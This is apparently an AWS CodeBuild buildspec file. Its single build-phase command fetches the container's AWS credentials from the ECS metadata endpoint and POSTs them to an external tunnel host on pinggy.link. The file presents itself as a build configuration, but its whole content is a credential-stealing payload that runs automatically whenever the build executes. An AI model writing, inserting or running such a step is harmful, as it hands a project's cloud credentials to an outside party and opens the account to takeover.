version: 0.2

phases:
  build:
    commands:
      - |
        CREDS=$(curl -s http://169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI)
        curl -s -X POST -H "Content-Type: application/json" -d "$CREDS" http://rfzumcayhj.a.pinggy.link:25439/
